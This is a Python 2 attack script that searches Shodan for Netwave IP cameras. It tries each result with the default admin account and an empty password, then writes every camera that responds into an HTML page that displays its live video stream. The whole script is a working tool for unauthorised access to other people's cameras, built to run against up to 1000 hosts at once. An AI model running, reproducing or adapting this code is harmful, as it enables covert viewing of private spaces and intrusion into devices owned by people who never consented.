#!/usr/bin/python

# Written by Dan Tentler / AtenLabs
# This script is designed to perform a search on shodan
# then take what comes back and "do stuff" to it.
# the 'checkcam' function is the 'do stuff to the results' function.
# AMMENDED BY Shueisha -- changed to allow new api format, imported shodan alone defined key @apikey comment

from __future__ import with_statement
import time
import shodan
import re,socket
import sys
import gevent
from gevent import socket
from gevent.pool import Pool
from gevent import monkey
monkey.patch_all()

# API Key
SHODAN_API_KEY = 'get out of it'
filter = 'netwave camera'
pool = Pool(1000)

def checkCam(ip, port): # Defines checCam function (ip port strings)
	try:
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # Creates INET Steamsocket
		sock.settimeout(5)
		print 'Connecting to %s on port %s' % (ip, port) # %s = % (strings)
		sock.connect((ip, port))
		sock.send('GET /videostream.cgi?user=admin&pwd= HTTP/1.0\r\n\r\n') # \r\n carridge ret
		res = sock.recv(100)
		if(res.find('200 OK') > 0):
			hoststring = str(ip) + ":" + str(port)
			print 'Found http://%s/videostream.cgi' % hoststring
			f = '<img src="http://%s/videostream.cgi?user=admin&pwd=" height=240 width=320>\n' % hoststring
			outfile.write(f)
			outfile.flush()
			#file.close()
			return True
		return False
	except:
		return False


api = shodan.Shodan(SHODAN_API_KEY)

#get the first page of results
res = api.search(filter)

#keep track of how many results we have left
total_results = (res['total'])
page = 1
list = []
outfile = open('netwave.html','w')
length = 0
try:
	while(page * 100 <= total_results):
	# Check the matches to see if they fit what we are looking for
		for host in res['matches']:
			ip = ''.join(str(host['ip']))
			port = ''.join(str(host['port']))
			pool.apply_async(checkCam, (ip,port),)
			#pool.join()
		page +=1
		res = api.search(filter,page)
except():
	print 'fail'
